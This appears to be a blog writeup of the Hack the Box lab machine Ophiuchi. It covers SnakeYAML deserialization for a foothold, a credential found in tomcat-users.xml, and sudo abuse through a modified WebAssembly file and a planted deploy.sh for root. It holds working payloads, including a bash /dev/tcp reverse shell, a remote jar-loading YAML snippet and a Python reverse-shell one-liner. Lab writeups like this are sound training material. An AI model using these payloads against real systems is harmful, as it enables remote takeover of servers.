+++
title = 'Hack the Box Ophiuchi Writeup'
date = 2021-07-16T16:37:47-07:00
hideToc = true
+++
![badge](/posts/images/hack-the-box-ophiuchi-writeup/badge.png)  

# Introduction  
Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven't even been exposed to the technology.


# Information Gathering
## Port Scan: nmapAutomator
We begin our reconnaissance by running *[nmapAutomator](https://github.com/21y4d/nmapAutomator)* via `sudo ./nmapAutomator.sh 10.10.10.227 All`. Among many other things, this runs our port scans with increasing comprehensiveness.


Output of Basic nmap scan below.
```
┌──(kali㉿kali)-[~/Tools/nmapAutomator/10.10.10.227/nmap]
└─$ cat Basic_10.10.10.227.nmap
# Nmap 7.91 scan initiated Fri Jun 11 19:18:21 2021 as: nmap -Pn -sCV -p22,8080 -oN nmap/Basic_10.10.10.227.nmap --dns-server=1.1.1.1 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 19:18:49 2021 -- 1 IP address (1 host up) scanned in 27.15 seconds
```

The open ports on the machine are **22** and **8080**. These are all we'll need to proceed through the rest of the box. Let's take a look at what's on the web port.

### Port 8080  
Browsing to the website we can see that it's a web application for parsing YAML.  
![yaml_webapp](/posts/images/hack-the-box-ophiuchi-writeup/parser.png)  
**Figure 1:** Online YAML parser


A quick search for "YAML parser vulnerability" leads us to "Snake YAML Deserilization" *[1](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)*.

![yaml_google](/posts/images/hack-the-box-ophiuchi-writeup/yaml_google.png)  
**Figure 2:** Snake YAML Deserilization Exploit.



# Exploitation  
## Initial foothold  
The SnakeYAML deserilization attack is made easier with artsploit's *[yaml-payload Github repository](https://github.com/artsploit/yaml-payload)* and an additional payload for a reverse shell can be found in *[issue 3](https://github.com/artsploit/yaml-payload/issues/3)*.

First, we'll clone the repository `git clone https://github.com/artsploit/yaml-payload.git`.  
![clone_repo](/posts/images/hack-the-box-ophiuchi-writeup/clone.png)
**Figure 3:** Clone yaml-payload repo.

We then navigate to `yaml-payload/src/artsploit` and modify the `AwesomeScriptEngineFactory()` method within `AwesomeScriptEngineFactory.java`. The default payload pops open the calculator application on MacOS. The payloads that are posted in *[issue 3](https://github.com/artsploit/yaml-payload/issues/3)* of this repo will call a reverse shell, so rather than recreating them, we'll drop the first payload into `AwesomeScriptEngineFactory.java` with our IP address as the callback.

```java
public AwesomeScriptEngineFactory() {
    String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.3/8081 0>&1"};
    String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
    try {
        Runtime.getRuntime().exec(cmd);
        Runtime.getRuntime().exec(jex);
        Runtime.getRuntime().exec("echo $jex");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

![awesome_jar](/posts/images/hack-the-box-ophiuchi-writeup/awesome_jar.png)
**Figure 4:** Placing reverse shell payload into `AwesomeScriptEngineFactory.java`'s `AwesomeScriptEngineFactory()` method.  

Now, as instructed by the repository, we'll compile the `AwesomeScriptEngineFactory.java` file and build our `yaml-payload.jar` file.  

![build](/posts/images/hack-the-box-ophiuchi-writeup/build.png)  
**Figure 5:** Compiling Java exploit and building `yaml-payload.jar`.

Since the snippet we'll be placing into the web application will pull `yaml-payload.jar` from a remote url, we'll copy the payload to our apache directory and make sure the server is running.

![copy_server](/posts/images/hack-the-box-ophiuchi-writeup/copy_server.png)  
**Figure 6:** Copy `yaml-payload.jar` to Apache's directory and start the server.

By placing the snippet below into the YAML parser, we'll download the payload we've just created and hosted, and execute it  on the victim machine (we must first not forget to start our netcat listener on port 8081)
```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.3/yaml-payload.jar"]
  ]]
]
```

![execute_foothold](/posts/images/hack-the-box-ophiuchi-writeup/execute_foothold.png)  
**Figure 7:** Snippet placed in web application.

Once we click "parse" the payload is executed and our shell is obtained.  

![foothold](/posts/images/hack-the-box-ophiuchi-writeup/foothold.png)  
**Figure 8:** Reverse shell as tomcat user.


## User Flag  
Moving from the initial foothold to the user flag on this machine is fairly simple. After some manual enumeration we'll find that `/opt/tomcat/conf/tomcat-users.xml` contains a password `whereisalimit` for the `admin` user.

![users_xml](/posts/images/hack-the-box-ophiuchi-writeup/users_xml.png)  
**Figure 9:** The `tomcat-users.xml` file containing credentials for `admin` user.  

To login as the `admin` user, we'll first use the old `python3 -c 'import pty; pty.spawn("/bin/bash")'` trick to get an interactive shell, and then simply `su` with the credentials we've found.  
![users](/posts/images/hack-the-box-ophiuchi-writeup/user.png)  
**Figure 10:** The flag for the `admin` user.  

## Root Flag  
Running *[lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)* reveals that we're able to execute `/opt/wasm-functions/index.go` via sudo without a password.

```
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
---
```

When we examine the `/opt/wasm-functions/index.go` file, we can see that it reads `main.wasm` without a path, and calls `deploy.sh` without a path. If a variable `f` is set equal to `1`.  

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

If we're able to control this `f` variable, then we can create our own `deploy.sh` script to be executed in another directory (presumable to gain us a reverse shell as root).  

To decompile `main.wasm` into a human readable `.wat` file, we can use the following *[https://github.com/WebAssembly/wabt.git](https://github.com/WebAssembly/wabt.git)*.

```
┌──(kali㉿kali)-[~/Tools]
└─$ git clone https://github.com/WebAssembly/wabt.git            
Cloning into 'wabt'...
remote: Enumerating objects: 29666, done.
remote: Counting objects: 100% (93/93), done.
remote: Compressing objects: 100% (72/72), done.
remote: Total 29666 (delta 37), reused 35 (delta 21), pack-reused 29573
Receiving objects: 100% (29666/29666), 20.83 MiB | 269.00 KiB/s, done.
Resolving deltas: 100% (23736/23736), done.
```

Since we've got the credentials to the `admin` user, it's convenient enough to just `scp`  `main.wasm` to our local machine to decompile. Once we've done so `~/Tools/wabt/bin/wasm2wat ~/main.wasm > ~/main.wat` yeilds the following web assembly code.

```WebAssembly
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

After more trial and error than I'd care to admit, it is determined that all we've got to do is change `i32.const` to be `1`, and the file becomes.

```WebAssembly
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

We finish up by rebuilding `main.wasm` via `~/Tools/wabt/bin/wat2wasm ~/main.wat > ~/main.wasm`, and use `scp` once more to get it back on the machine.  
![recompile](/posts/images/hack-the-box-ophiuchi-writeup/recompile.png)  
**Figure 11:** After modifying `i32.const` to be equal `1`, we place `main.wasm` back onto the victim machine.

Next, we ssh back into the box as `admin`. We'll navigate to the `/tmp` directory and create our own `deploy.sh` to call our reverse shell. Since we know port `8081` worked last time, we'll use that again (make sure the old listener used to catch the foothold is reset). The reverse shell payload will be the following python payload.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

![deploy_sh](/posts/images/hack-the-box-ophiuchi-writeup/deploy_sh.png)  
**Figure 12:** SSH back in and create a malicious `deploy.sh` to call a reverse shell.

To gain root privileges we'll do what we know we're allowed to do which is `sudo /usr/bin/go run /opt/wasm-functions/index.go`, and as you can see below netcat has caught the root reverse shell.  
![rooted](/posts/images/hack-the-box-ophiuchi-writeup/rooted.png)  
**Figure 13:** Root achieved via `/tmp` directory containing our own `deploy.sh` and `main.wasm` files.  

# Conclusion  
Knowing very little about Golang, and even less about WebAssembly, made the privilege escalation to root a real bastard for me. It was a great learning experience to decompile and recompile WebAssembly code. The box overall was extremely enjoyable (but I still am not sure how to pronounce the name).


# References
1. [https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)
2. [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)
3. [https://github.com/artsploit/yaml-payload/issues/3](https://github.com/artsploit/yaml-payload/issues/3)
4. [https://github.com/WebAssembly/wabt](https://github.com/WebAssembly/wabt)
